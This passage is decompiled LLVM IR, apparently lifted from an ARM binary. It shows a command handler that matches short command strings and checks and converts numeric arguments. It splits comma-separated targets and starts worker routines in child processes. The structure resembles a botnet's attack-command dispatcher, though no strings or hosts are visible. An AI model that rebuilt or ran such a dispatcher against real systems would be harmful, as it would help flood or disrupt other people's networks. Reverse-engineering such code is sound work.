  uselistorder i32* %r2.global-to-local, { 42, 39, 38, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 40, 41, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_12780, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @function_1059c, { 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8 2, { 3, 1, 4, 2, 0, 5 }
  uselistorder i32 -184, { 1, 2, 0 }
  uselistorder i32 ()* @function_10644, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_e6c4, { 8, 2, 3, 1, 4, 5, 6, 7, 0 }
  uselistorder label %dec_label_pc_e5b0, { 1, 0 }
  uselistorder label %dec_label_pc_e3dc, { 1, 0 }
  uselistorder label %dec_label_pc_e38c, { 1, 0 }
}

define i32 @function_e708(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_e708:
  %tmp = ptrtoint i32* %arg2 to i32
  %stack_var_-4 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_e708 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_e708, i32* @ip, align 4
  %v3_e70c = load i32, i32* @r4, align 4
  %v6_e70c = load i32, i32* @fp, align 4
  store i32 59156, i32* %stack_var_-4, align 4
  %v2_e710 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_e710, i32* @fp, align 4
  %v2_e724 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_19e64.49 to i32), i32* @r1, align 4
  %v3_e730 = inttoptr i32 %v2_e724 to i8*
  %v4_e730 = call i32 @function_12030(i8* %v3_e730, i32 ptrtoint ([5 x i8]* @global_var_19e64.49 to i32))
  %v2_e738 = icmp eq i32 %v4_e730, 0
  br i1 %v2_e738, label %dec_label_pc_e740, label %dec_label_pc_e758

dec_label_pc_e740:                                ; preds = %dec_label_pc_e708
  %v2_e744 = load i32, i32* @global_var_23700.47, align 4
  %v3_e750 = call i32 @function_8f1c(i32 %v2_e744, i32 ptrtoint ([6 x i8]* @global_var_19ed4.97 to i32))
  br label %dec_label_pc_f1ac

dec_label_pc_e758:                                ; preds = %dec_label_pc_e708
  %v2_e75c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_19edc.99 to i32), i32* @r1, align 4
  %v3_e768 = inttoptr i32 %v2_e75c to i8*
  %v4_e768 = call i32 @function_12030(i8* %v3_e768, i32 ptrtoint ([11 x i8]* @global_var_19edc.99 to i32))
  %v2_e770 = icmp eq i32 %v4_e768, 0
  br i1 %v2_e770, label %dec_label_pc_e778, label %dec_label_pc_e7a4

dec_label_pc_e778:                                ; preds = %dec_label_pc_e758
  %v2_e77c = load i32, i32* @global_var_23700.47, align 4
  store i32 %v2_e77c, i32* @r4, align 4
  %v2_e784 = load i32, i32* @global_var_29770.62, align 4
  store i32 %v2_e784, i32* @r0, align 4
  %v1_e788 = call i32 @function_126cc(i32 %v2_e784)
  %v0_e790 = load i32, i32* @r4, align 4
  store i32 %v1_e788, i32* @r2, align 4
  %v3_e79c = call i32 @function_8f1c(i32 %v0_e790, i32 ptrtoint ([10 x i8]* @global_var_19ee8.102 to i32))
  br label %dec_label_pc_f1ac

dec_label_pc_e7a4:                                ; preds = %dec_label_pc_e758
  %v2_e7a8 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_19ef4.104 to i32), i32* @r1, align 4
  %v3_e7b4 = inttoptr i32 %v2_e7a8 to i8*
  %v4_e7b4 = call i32 @function_12030(i8* %v3_e7b4, i32 ptrtoint ([5 x i8]* @global_var_19ef4.104 to i32))
  %v2_e7bc = icmp eq i32 %v4_e7b4, 0
  br i1 %v2_e7bc, label %dec_label_pc_e7c4, label %dec_label_pc_e928

dec_label_pc_e7c4:                                ; preds = %dec_label_pc_e7a4
  %v7_e7cc = icmp slt i32 %arg1, 4
  br i1 %v7_e7cc, label %dec_label_pc_f1ac, label %dec_label_pc_e7d0

dec_label_pc_e7d0:                                ; preds = %dec_label_pc_e7c4
  %v1_e7d4 = add i32 %tmp, 8
  %v1_e7d8 = inttoptr i32 %v1_e7d4 to i32*
  %v2_e7d8 = load i32, i32* %v1_e7d8, align 4
  store i32 %v2_e7d8, i32* @r0, align 4
  %v1_e7e0 = call i32 @function_14030(i32 %v2_e7d8)
  %tmp73 = icmp slt i32 %v1_e7e0, 1
  br i1 %tmp73, label %dec_label_pc_f1ac, label %dec_label_pc_e7f0

dec_label_pc_e7f0:                                ; preds = %dec_label_pc_e7d0
  %v1_e7f4 = add i32 %tmp, 12
  %v1_e7f8 = inttoptr i32 %v1_e7f4 to i32*
  %v2_e7f8 = load i32, i32* %v1_e7f8, align 4
  store i32 %v2_e7f8, i32* @r0, align 4
  %v1_e800 = call i32 @function_14030(i32 %v2_e7f8)
  %v5_e80c = icmp sgt i32 %v1_e800, 0
  br i1 %v5_e80c, label %dec_label_pc_e814, label %dec_label_pc_f1ac

dec_label_pc_e814:                                ; preds = %dec_label_pc_e7f0
  %v1_e818 = add i32 %tmp, 4
  %v1_e81c = inttoptr i32 %v1_e818 to i32*
  %v2_e81c = load i32, i32* %v1_e81c, align 4
  %v2_e82c = load i32, i32* %v1_e7d8, align 4
  store i32 %v2_e82c, i32* @r0, align 4
  %v1_e834 = call i32 @function_14030(i32 %v2_e82c)
  %v2_e848 = load i32, i32* %v1_e7f8, align 4
  store i32 %v2_e848, i32* @r0, align 4
  %v1_e850 = call i32 @function_14030(i32 %v2_e848)
  store i32 %v2_e81c, i32* @r0, align 4
  %v2_e868 = call i32 @function_12308(i32 %v2_e81c, i32 44)
  store i32 %v2_e868, i32* @r0, align 4
  %v2_e870 = icmp eq i32 %v2_e868, 0
  br i1 %v2_e870, label %dec_label_pc_e8f0, label %dec_label_pc_e878

dec_label_pc_e878:                                ; preds = %dec_label_pc_e814
  store i32 ptrtoint (i32* @global_var_19ea8.80 to i32), i32* @r1, align 4
  %v2_e884 = call i32 @function_12410(i32 %v2_e81c, i32 ptrtoint (i32* @global_var_19ea8.80 to i32))
  store i32 %v2_e884, i32* @r0, align 4
  %v2_e8e427 = icmp eq i32 %v2_e884, 0
  br i1 %v2_e8e427, label %dec_label_pc_e928, label %dec_label_pc_e894

dec_label_pc_e894:                                ; preds = %dec_label_pc_e878, %dec_label_pc_e8cc
  %storemerge1628 = phi i32 [ %v2_e8d4, %dec_label_pc_e8cc ], [ %v2_e884, %dec_label_pc_e878 ]
  %v0_e894 = call i32 @function_a104()
  %v2_e89c = icmp eq i32 %v0_e894, 0
  br i1 %v2_e89c, label %dec_label_pc_e8a4, label %dec_label_pc_e8cc

dec_label_pc_e8a4:                                ; preds = %dec_label_pc_e894
  %v4_e8b0 = call i32 @function_e15c(i32 %storemerge1628, i32 %v1_e834, i32 %v1_e850, i32 0)
  %v2_e8b8 = load i32, i32* @global_var_23700.47, align 4
  %v1_e8c0 = call i32 @function_108d0(i32 %v2_e8b8)
  %v1_e8c8 = call i32 @function_1086c(i32 0)
  br label %dec_label_pc_e8cc

dec_label_pc_e8cc:                                ; preds = %dec_label_pc_e894, %dec_label_pc_e8a4
  store i32 ptrtoint (i32* @global_var_19ea8.80 to i32), i32* @r1, align 4
  %v2_e8d4 = call i32 @function_12410(i32 0, i32 ptrtoint (i32* @global_var_19ea8.80 to i32))
  store i32 %v2_e8d4, i32* @r0, align 4
  %v2_e8e4 = icmp eq i32 %v2_e8d4, 0
  br i1 %v2_e8e4, label %dec_label_pc_e928, label %dec_label_pc_e894

dec_label_pc_e8f0:                                ; preds = %dec_label_pc_e814
  %v0_e8f0 = call i32 @function_a104()
  %v2_e8f8 = icmp eq i32 %v0_e8f0, 0
  br i1 %v2_e8f8, label %dec_label_pc_e900, label %dec_label_pc_f1ac

dec_label_pc_e900:                                ; preds = %dec_label_pc_e8f0
  %v4_e90c = call i32 @function_e15c(i32 %v2_e81c, i32 %v1_e834, i32 %v1_e850, i32 0)
  %v2_e914 = load i32, i32* @global_var_23700.47, align 4
  %v1_e91c = call i32 @function_108d0(i32 %v2_e914)
  %v1_e924 = call i32 @function_1086c(i32 0)
  br label %dec_label_pc_e928

dec_label_pc_e928:                                ; preds = %dec_label_pc_e8cc, %dec_label_pc_e878, %dec_label_pc_e7a4, %dec_label_pc_e900
  %v2_e92c = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_19efc.107 to i32), i32* @r1, align 4
  %v3_e938 = inttoptr i32 %v2_e92c to i8*
  %v4_e938 = call i32 @function_12030(i8* %v3_e938, i32 ptrtoint ([5 x i8]* @global_var_19efc.107 to i32))
  %v2_e940 = icmp eq i32 %v4_e938, 0
  br i1 %v2_e940, label %dec_label_pc_e948, label %dec_label_pc_eaac

dec_label_pc_e948:                                ; preds = %dec_label_pc_e928
  %v7_e950 = icmp slt i32 %arg1, 4
  br i1 %v7_e950, label %dec_label_pc_f1ac, label %dec_label_pc_e954

dec_label_pc_e954:                                ; preds = %dec_label_pc_e948
  %v1_e958 = add i32 %tmp, 8
  %v1_e95c = inttoptr i32 %v1_e958 to i32*
  %v2_e95c = load i32, i32* %v1_e95c, align 4
  store i32 %v2_e95c, i32* @r0, align 4
  %v1_e964 = call i32 @function_14030(i32 %v2_e95c)
  %tmp74 = icmp slt i32 %v1_e964, 1
  br i1 %tmp74, label %dec_label_pc_f1ac, label %dec_label_pc_e974

dec_label_pc_e974:                                ; preds = %dec_label_pc_e954
  %v1_e978 = add i32 %tmp, 12
  %v1_e97c = inttoptr i32 %v1_e978 to i32*
  %v2_e97c = load i32, i32* %v1_e97c, align 4
  store i32 %v2_e97c, i32* @r0, align 4
  %v1_e984 = call i32 @function_14030(i32 %v2_e97c)
  %v5_e990 = icmp sgt i32 %v1_e984, 0
  br i1 %v5_e990, label %dec_label_pc_e998, label %dec_label_pc_f1ac

dec_label_pc_e998:                                ; preds = %dec_label_pc_e974
  %v1_e99c = add i32 %tmp, 4
  %v1_e9a0 = inttoptr i32 %v1_e99c to i32*
  %v2_e9a0 = load i32, i32* %v1_e9a0, align 4
  %v2_e9b0 = load i32, i32* %v1_e95c, align 4
  store i32 %v2_e9b0, i32* @r0, align 4
  %v1_e9b8 = call i32 @function_14030(i32 %v2_e9b0)
  %v2_e9cc = load i32, i32* %v1_e97c, align 4
  store i32 %v2_e9cc, i32* @r0, align 4
  %v1_e9d4 = call i32 @function_14030(i32 %v2_e9cc)
  store i32 %v2_e9a0, i32* @r0, align 4
  %v2_e9ec = call i32 @function_12308(i32 %v2_e9a0, i32 44)
  store i32 %v2_e9ec, i32* @r0, align 4
  %v2_e9f4 = icmp eq i32 %v2_e9ec, 0
  br i1 %v2_e9f4, label %dec_label_pc_ea74, label %dec_label_pc_e9fc

dec_label_pc_e9fc:                                ; preds = %dec_label_pc_e998
  store i32 ptrtoint (i32* @global_var_19ea8.80 to i32), i32* @r1, align 4
  %v2_ea08 = call i32 @function_12410(i32 %v2_e9a0, i32 ptrtoint (i32* @global_var_19ea8.80 to i32))
  store i32 %v2_ea08, i32* @r0, align 4
  %v2_ea6824 = icmp eq i32 %v2_ea08, 0
  br i1 %v2_ea6824, label %dec_label_pc_eaac, label %dec_label_pc_ea18

dec_label_pc_ea18:                                ; preds = %dec_label_pc_e9fc, %dec_label_pc_ea50
  %storemerge1425 = phi i32 [ %v2_ea58, %dec_label_pc_ea50 ], [ %v2_ea08, %dec_label_pc_e9fc ]
  %v0_ea18 = call i32 @function_a104()
  %v2_ea20 = icmp eq i32 %v0_ea18, 0
  br i1 %v2_ea20, label %dec_label_pc_ea28, label %dec_label_pc_ea50

dec_label_pc_ea28:                                ; preds = %dec_label_pc_ea18
  %v4_ea34 = call i32 @function_dc58(i32 %storemerge1425, i32 %v1_e9b8, i32 %v1_e9d4, i32 0)
  %v2_ea3c = load i32, i32* @global_var_23700.47, align 4
  %v1_ea44 = call i32 @function_108d0(i32 %v2_ea3c)
  %v1_ea4c = call i32 @function_1086c(i32 0)
  br label %dec_label_pc_ea50

dec_label_pc_ea50:                                ; preds = %dec_label_pc_ea18, %dec_label_pc_ea28
  store i32 ptrtoint (i32* @global_var_19ea8.80 to i32), i32* @r1, align 4
  %v2_ea58 = call i32 @function_12410(i32 0, i32 ptrtoint (i32* @global_var_19ea8.80 to i32))
  store i32 %v2_ea58, i32* @r0, align 4
  %v2_ea68 = icmp eq i32 %v2_ea58, 0
  br i1 %v2_ea68, label %dec_label_pc_eaac, label %dec_label_pc_ea18

dec_label_pc_ea74:                                ; preds = %dec_label_pc_e998
  %v0_ea74 = call i32 @function_a104()
  %v2_ea7c = icmp eq i32 %v0_ea74, 0
  br i1 %v2_ea7c, label %dec_label_pc_ea84, label %dec_label_pc_f1ac

dec_label_pc_ea84:                                ; preds = %dec_label_pc_ea74
  %v4_ea90 = call i32 @function_dc58(i32 %v2_e9a0, i32 %v1_e9b8, i32 %v1_e9d4, i32 0)
  %v2_ea98 = load i32, i32* @global_var_23700.47, align 4
  %v1_eaa0 = call i32 @function_108d0(i32 %v2_ea98)
  %v1_eaa8 = call i32 @function_1086c(i32 0)
  br label %dec_label_pc_eaac

dec_label_pc_eaac:                                ; preds = %dec_label_pc_ea50, %dec_label_pc_e9fc, %dec_label_pc_e928, %dec_label_pc_ea84
  %v2_eab0 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_19f04.109 to i32), i32* @r1, align 4
  %v3_eabc = inttoptr i32 %v2_eab0 to i8*
  %v4_eabc = call i32 @function_12030(i8* %v3_eabc, i32 ptrtoint ([4 x i8]* @global_var_19f04.109 to i32))
  %v2_eac4 = icmp eq i32 %v4_eabc, 0
  br i1 %v2_eac4, label %dec_label_pc_eacc, label %dec_label_pc_ed7c

dec_label_pc_eacc:                                ; preds = %dec_label_pc_eaac
  %v7_ead4 = icmp slt i32 %arg1, 6
  br i1 %v7_ead4, label %dec_label_pc_f1ac, label %dec_label_pc_ead8

dec_label_pc_ead8:                                ; preds = %dec_label_pc_eacc
  %v1_eadc = add i32 %tmp, 12
  %v1_eae0 = inttoptr i32 %v1_eadc to i32*
  %v2_eae0 = load i32, i32* %v1_eae0, align 4
  store i32 %v2_eae0, i32* @r0, align 4
  %v1_eae8 = call i32 @function_14030(i32 %v2_eae0)
  %v7_eaf0 = icmp eq i32 %v1_eae8, -1
  br i1 %v7_eaf0, label %dec_label_pc_f1ac, label %dec_label_pc_eaf8

dec_label_pc_eaf8:                                ; preds = %dec_label_pc_ead8
  %v1_eafc = add i32 %tmp, 8
  %v1_eb00 = inttoptr i32 %v1_eafc to i32*
  %v2_eb00 = load i32, i32* %v1_eb00, align 4
  store i32 %v2_eb00, i32* @r0, align 4
  %v1_eb08 = call i32 @function_14030(i32 %v2_eb00)
  %v7_eb10 = icmp eq i32 %v1_eb08, -1
  br i1 %v7_eb10, label %dec_label_pc_f1ac, label %dec_label_pc_eb18

dec_label_pc_eb18:                                ; preds = %dec_label_pc_eaf8
  %v1_eb1c = add i32 %tmp, 16
  %v1_eb20 = inttoptr i32 %v1_eb1c to i32*
  %v2_eb20 = load i32, i32* %v1_eb20, align 4
  store i32 %v2_eb20, i32* @r0, align 4
  %v1_eb28 = call i32 @function_14030(i32 %v2_eb20)
  %v7_eb30 = icmp eq i32 %v1_eb28, -1
  br i1 %v7_eb30, label %dec_label_pc_f1ac, label %dec_label_pc_eb38

dec_label_pc_eb38:                                ; preds = %dec_label_pc_eb18
  %v1_eb3c = add i32 %tmp, 20
  %v1_eb40 = inttoptr i32 %v1_eb3c to i32*
  %v2_eb40 = load i32, i32* %v1_eb40, align 4
  store i32 %v2_eb40, i32* @r0, align 4
  %v1_eb48 = call i32 @function_14030(i32 %v2_eb40)
  %v7_eb50 = icmp eq i32 %v1_eb48, -1
  br i1 %v7_eb50, label %dec_label_pc_f1ac, label %dec_label_pc_eb58

dec_label_pc_eb58:                                ; preds = %dec_label_pc_eb38
  %v2_eb60 = load i32, i32* %v1_eb40, align 4
  store i32 %v2_eb60, i32* @r0, align 4
  %v1_eb68 = call i32 @function_14030(i32 %v2_eb60)
  %v8_eb7c = icmp sgt i32 %v1_eb68, 65500
  br i1 %v8_eb7c, label %dec_label_pc_f1ac, label %dec_label_pc_eb80

dec_label_pc_eb80:                                ; preds = %dec_label_pc_eb58
  %v2_eb88 = load i32, i32* %v1_eb20, align 4
  store i32 %v2_eb88, i32* @r0, align 4
  %v1_eb90 = call i32 @function_14030(i32 %v2_eb88)
  %v8_eb9c = icmp sgt i32 %v1_eb90, 32
  br i1 %v8_eb9c, label %dec_label_pc_f1ac, label %dec_label_pc_eba0

dec_label_pc_eba0:                                ; preds = %dec_label_pc_eb80
  %v7_eba4 = icmp eq i32 %arg1, 7
  br i1 %v7_eba4, label %dec_label_pc_ebac, label %dec_label_pc_ebd0

dec_label_pc_ebac:                                ; preds = %dec_label_pc_eba0
  %v1_ebb0 = add i32 %tmp, 24
  %v1_ebb4 = inttoptr i32 %v1_ebb0 to i32*
  %v2_ebb4 = load i32, i32* %v1_ebb4, align 4
  store i32 %v2_ebb4, i32* @r0, align 4
  %v1_ebbc = call i32 @function_14030(i32 %v2_ebb4)
  %v5_ebc8 = icmp sgt i32 %v1_ebbc, 0
  br i1 %v5_ebc8, label %dec_label_pc_ebd0, label %dec_label_pc_f1ac

dec_label_pc_ebd0:                                ; preds = %dec_label_pc_eba0, %dec_label_pc_ebac
  %v1_ebd4 = add i32 %tmp, 4
  %v1_ebd8 = inttoptr i32 %v1_ebd4 to i32*
  %v2_ebd8 = load i32, i32* %v1_ebd8, align 4
  %v2_ebe8 = load i32, i32* %v1_eb00, align 4
  store i32 %v2_ebe8, i32* @r0, align 4
  %v1_ebf0 = call i32 @function_14030(i32 %v2_ebe8)
  %v2_ec04 = load i32, i32* %v1_eae0, align 4
  store i32 %v2_ec04, i32* @r0, align 4
  %v1_ec0c = call i32 @function_14030(i32 %v2_ec04)
  %v2_ec20 = load i32, i32* %v1_eb20, align 4
  store i32 %v2_ec20, i32* @r0, align 4
  %v1_ec28 = call i32 @function_14030(i32 %v2_ec20)
  %v2_ec3c = load i32, i32* %v1_eb40, align 4
  store i32 %v2_ec3c, i32* @r0, align 4
  %v1_ec44 = call i32 @function_14030(i32 %v2_ec3c)
  br i1 %v7_eba4, label %dec_label_pc_ec5c, label %dec_label_pc_ec78

dec_label_pc_ec5c:                                ; preds = %dec_label_pc_ebd0
  %v1_ec60 = add i32 %tmp, 24
  %v1_ec64 = inttoptr i32 %v1_ec60 to i32*
  %v2_ec64 = load i32, i32* %v1_ec64, align 4
  store i32 %v2_ec64, i32* @r0, align 4
  %v1_ec6c = call i32 @function_14030(i32 %v2_ec64)
  br label %dec_label_pc_ec80

dec_label_pc_ec78:                                ; preds = %dec_label_pc_ebd0
  br label %dec_label_pc_ec80

dec_label_pc_ec80:                                ; preds = %dec_label_pc_ec5c, %dec_label_pc_ec78
  %storemerge5 = phi i32 [ 10, %dec_label_pc_ec78 ], [ %v1_ec6c, %dec_label_pc_ec5c ]
  store i32 %v2_ebd8, i32* @r0, align 4
  %v2_ec94 = call i32 @function_12308(i32 %v2_ebd8, i32 44)
  store i32 %v2_ec94, i32* @r0, align 4
  %v2_ec9c = icmp eq i32 %v2_ec94, 0
  br i1 %v2_ec9c, label %dec_label_pc_ed30, label %dec_label_pc_eca4

dec_label_pc_eca4:                                ; preds = %dec_label_pc_ec80
  store i32 ptrtoint (i32* @global_var_19ea8.80 to i32), i32* @r1, align 4
  %v2_ecb0 = call i32 @function_12410(i32 %v2_ebd8, i32 ptrtoint (i32* @global_var_19ea8.80 to i32))
  store i32 %v2_ecb0, i32* @r0, align 4
  %v2_ed2421 = icmp eq i32 %v2_ecb0, 0
  br i1 %v2_ed2421, label %dec_label_pc_ed7c, label %dec_label_pc_ecc0

dec_label_pc_ecc0:                                ; preds = %dec_label_pc_eca4, %dec_label_pc_ed0c
  %storemerge1222 = phi i32 [ %v2_ed14, %dec_label_pc_ed0c ], [ %v2_ecb0, %dec_label_pc_eca4 ]
  %v0_ecc0 = call i32 @function_a104()
  %v2_ecc8 = icmp eq i32 %v0_ecc0, 0
  br i1 %v2_ecc8, label %dec_label_pc_ecd0, label %dec_label_pc_ed0c

dec_label_pc_ecd0:                                ; preds = %dec_label_pc_ecc0
  %v6_ecf0 = call i32 @function_cfe0(i32 %storemerge1222, i32 %v1_ebf0, i32 %v1_ec0c, i32 %v1_ec28, i32 %v1_ec44, i32 %storemerge5)
  %v2_ecf8 = load i32, i32* @global_var_23700.47, align 4
  %v1_ed00 = call i32 @function_108d0(i32 %v2_ecf8)
  %v1_ed08 = call i32 @function_1086c(i32 0)
  br label %dec_label_pc_ed0c

dec_label_pc_ed0c:                                ; preds = %dec_label_pc_ecc0, %dec_label_pc_ecd0
  store i32 ptrtoint (i32* @global_var_19ea8.80 to i32), i32* @r1, align 4
  %v2_ed14 = call i32 @function_12410(i32 0, i32 ptrtoint (i32* @global_var_19ea8.80 to i32))
  store i32 %v2_ed14, i32* @r0, align 4
  %v2_ed24 = icmp eq i32 %v2_ed14, 0
  br i1 %v2_ed24, label %dec_label_pc_ed7c, label %dec_label_pc_ecc0

dec_label_pc_ed30:                                ; preds = %dec_label_pc_ec80
  %v0_ed30 = call i32 @function_a104()
  %v2_ed38 = icmp eq i32 %v0_ed30, 0
  br i1 %v2_ed38, label %dec_label_pc_ed40, label %dec_label_pc_f1ac

dec_label_pc_ed40:                                ; preds = %dec_label_pc_ed30
  %v6_ed60 = call i32 @function_cfe0(i32 %v2_ebd8, i32 %v1_ebf0, i32 %v1_ec0c, i32 %v1_ec28, i32 %v1_ec44, i32 %storemerge5)
  %v2_ed68 = load i32, i32* @global_var_23700.47, align 4
  %v1_ed70 = call i32 @function_108d0(i32 %v2_ed68)
  %v1_ed78 = call i32 @function_1086c(i32 0)
  br label %dec_label_pc_ed7c

dec_label_pc_ed7c:                                ; preds = %dec_label_pc_ed0c, %dec_label_pc_eca4, %dec_label_pc_eaac, %dec_label_pc_ed40
  %v2_ed80 = load i32, i32* %arg2, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_19f08.111 to i32), i32* @r1, align 4
  %v3_ed8c = inttoptr i32 %v2_ed80 to i8*
  %v4_ed8c = call i32 @function_12030(i8* %v3_ed8c, i32 ptrtoint ([4 x i8]* @global_var_19f08.111 to i32))
  %v2_ed94 = icmp eq i32 %v4_ed8c, 0
  br i1 %v2_ed94, label %dec_label_pc_ed9c, label %dec_label_pc_f06c

dec_label_pc_ed9c:                                ; preds = %dec_label_pc_ed7c
  %v7_eda4 = icmp slt i32 %arg1, 6
  br i1 %v7_eda4, label %dec_label_pc_f1ac, label %dec_label_pc_eda8

dec_label_pc_eda8:                                ; preds = %dec_label_pc_ed9c
  %v1_edac = add i32 %tmp, 12
  %v1_edb0 = inttoptr i32 %v1_edac to i32*
  %v2_edb0 = load i32, i32* %v1_edb0, align 4
  store i32 %v2_edb0, i32* @r0, align 4
  %v1_edb8 = call i32 @function_14030(i32 %v2_edb0)
  %v7_edc0 = icmp eq i32 %v1_edb8, -1
  br i1 %v7_edc0, label %dec_label_pc_f1ac, label %dec_label_pc_edc8

dec_label_pc_edc8:                                ; preds = %dec_label_pc_eda8
  %v1_edcc = add i32 %tmp, 8
  %v1_edd0 = inttoptr i32 %v1_edcc to i32*
  %v2_edd0 = load i32, i32* %v1_edd0, align 4
  store i32 %v2_edd0, i32* @r0, align 4
  %v1_edd8 = call i32 @function_14030(i32 %v2_edd0)
  %v7_ede0 = icmp eq i32 %v1_edd8, -1
  br i1 %v7_ede0, label %dec_label_pc_f1ac, label %dec_label_pc_ede8

dec_label_pc_ede8:                                ; preds = %dec_label_pc_edc8
  %v1_edec = add i32 %tmp, 16
  %v1_edf0 = inttoptr i32 %v1_edec to i32*
  %v2_edf0 = load i32, i32* %v1_edf0, align 4
  store i32 %v2_edf0, i32* @r0, align 4
  %v1_edf8 = call i32 @function_14030(i32 %v2_edf0)
  %v7_ee00 = icmp eq i32 %v1_edf8, -1
  br i1 %v7_ee00, label %dec_label_pc_f1ac, label %dec_label_pc_ee08

dec_label_pc_ee08:                                ; preds = %dec_label_pc_ede8
  %v2_ee10 = load i32, i32* %v1_edf0, align 4
  store i32 %v2_ee10, i32* @r0, align 4
  %v1_ee18 = call i32 @function_14030(i32 %v2_ee10)
  %v8_ee24 = icmp sgt i32 %v1_ee18, 32
  br i1 %v8_ee24, label %dec_label_pc_f1ac, label %dec_label_pc_ee28

dec_label_pc_ee28:                                ; preds = %dec_label_pc_ee08
  %v7_ee30 = icmp slt i32 %arg1, 7
  br i1 %v7_ee30, label %dec_label_pc_ee54, label %dec_label_pc_ee34

dec_label_pc_ee34:                                ; preds = %dec_label_pc_ee28
  %v1_ee38 = add i32 %tmp, 24
  %v1_ee3c = inttoptr i32 %v1_ee38 to i32*
  %v2_ee3c = load i32, i32* %v1_ee3c, align 4
  store i32 %v2_ee3c, i32* @r0, align 4
  %v1_ee44 = call i32 @function_14030(i32 %v2_ee3c)
  %v1_ee4c = icmp slt i32 %v1_ee44, 0
  br i1 %v1_ee4c, label %dec_label_pc_f1ac, label %dec_label_pc_ee54

dec_label_pc_ee54:                                ; preds = %dec_label_pc_ee34, %dec_label_pc_ee28
  %v7_ee58 = icmp eq i32 %arg1, 8
  br i1 %v7_ee58, label %dec_label_pc_ee60, label %dec_label_pc_ee84

dec_label_pc_ee60:                                ; preds = %dec_label_pc_ee54
  %v1_ee64 = add i32 %tmp, 28
  %v1_ee68 = inttoptr i32 %v1_ee64 to i32*
  %v2_ee68 = load i32, i32* %v1_ee68, align 4
  store i32 %v2_ee68, i32* @r0, align 4
  %v1_ee70 = call i32 @function_14030(i32 %v2_ee68)
  %v5_ee7c = icmp sgt i32 %v1_ee70, 0
  br i1 %v5_ee7c, label %dec_label_pc_ee84, label %dec_label_pc_f1ac

dec_label_pc_ee84:                                ; preds = %dec_label_pc_ee54, %dec_label_pc_ee60
  %v1_ee88 = add i32 %tmp, 4
  %v1_ee8c = inttoptr i32 %v1_ee88 to i32*
  %v2_ee8c = load i32, i32* %v1_ee8c, align 4
  %v2_ee9c = load i32, i32* %v1_edd0, align 4
  store i32 %v2_ee9c, i32* @r0, align 4
  %v1_eea4 = call i32 @function_14030(i32 %v2_ee9c)
  %v2_eeb8 = load i32, i32* %v1_edb0, align 4
  store i32 %v2_eeb8, i32* @r0, align 4
  %v1_eec0 = call i32 @function_14030(i32 %v2_eeb8)
  %v2_eed4 = load i32, i32* %v1_edf0, align 4
  store i32 %v2_eed4, i32* @r0, align 4
  %v1_eedc = call i32 @function_14030(i32 %v2_eed4)
  %v1_eeec = add i32 %tmp, 20
  %v1_eef0 = inttoptr i32 %v1_eeec to i32*
  %v2_eef0 = load i32, i32* %v1_eef0, align 4
  br i1 %v7_ee58, label %dec_label_pc_ef04, label %dec_label_pc_ef20

dec_label_pc_ef04:                                ; preds = %dec_label_pc_ee84
  %v1_ef08 = add i32 %tmp, 28
  %v1_ef0c = inttoptr i32 %v1_ef08 to i32*
  %v2_ef0c = load i32, i32* %v1_ef0c, align 4
  store i32 %v2_ef0c, i32* @r0, align 4
  %v1_ef14 = call i32 @function_14030(i32 %v2_ef0c)
  br label %dec_label_pc_ef28

dec_label_pc_ef20:                                ; preds = %dec_label_pc_ee84
  br label %dec_label_pc_ef28

dec_label_pc_ef28:                                ; preds = %dec_label_pc_ef04, %dec_label_pc_ef20
  %storemerge3 = phi i32 [ 10, %dec_label_pc_ef20 ], [ %v1_ef14, %dec_label_pc_ef04 ]
  br i1 %v7_ee30, label %dec_label_pc_ef58, label %dec_label_pc_ef3c

dec_label_pc_ef3c:                                ; preds = %dec_label_pc_ef28
  %v1_ef40 = add i32 %tmp, 24
  %v1_ef44 = inttoptr i32 %v1_ef40 to i32*
  %v2_ef44 = load i32, i32* %v1_ef44, align 4
  store i32 %v2_ef44, i32* @r0, align 4
  %v1_ef4c = call i32 @function_14030(i32 %v2_ef44)
  br label %dec_label_pc_ef60

dec_label_pc_ef58:                                ; preds = %dec_label_pc_ef28
  br label %dec_label_pc_ef60

dec_label_pc_ef60:                                ; preds = %dec_label_pc_ef3c, %dec_label_pc_ef58
  %storemerge2 = phi i32 [ 0, %dec_label_pc_ef58 ], [ %v1_ef4c, %dec_label_pc_ef3c ]
  store i32 %v2_ee8c, i32* @r0, align 4
  %v2_ef74 = call i32 @function_12308(i32 %v2_ee8c, i32 44)
  store i32 %v2_ef74, i32* @r0, align 4
  %v2_ef7c = icmp eq i32 %v2_ef74, 0
  br i1 %v2_ef7c, label %dec_label_pc_f018, label %dec_label_pc_ef84

dec_label_pc_ef84:                                ; preds = %dec_label_pc_ef60
  store i32 ptrtoint (i32* @global_var_19ea8.80 to i32), i32* @r1, align 4
  %v2_ef90 = call i32 @function_12410(i32 %v2_ee8c, i32 ptrtoint (i32* @global_var_19ea8.80 to i32))
  store i32 %v2_ef90, i32* @r0, align 4
  %v2_f00c18 = icmp eq i32 %v2_ef90, 0
  br i1 %v2_f00c18, label %dec_label_pc_f06c, label %dec_label_pc_efa0

dec_label_pc_efa0:                                ; preds = %dec_label_pc_ef84, %dec_label_pc_eff4
  %storemerge1019 = phi i32 [ %v2_effc, %dec_label_pc_eff4 ], [ %v2_ef90, %dec_label_pc_ef84 ]
  %v0_efa0 = call i32 @function_a104()
  %v2_efa8 = icmp eq i32 %v0_efa0, 0
  br i1 %v2_efa8, label %dec_label_pc_efb0, label %dec_label_pc_eff4

dec_label_pc_efb0:                                ; preds = %dec_label_pc_efa0
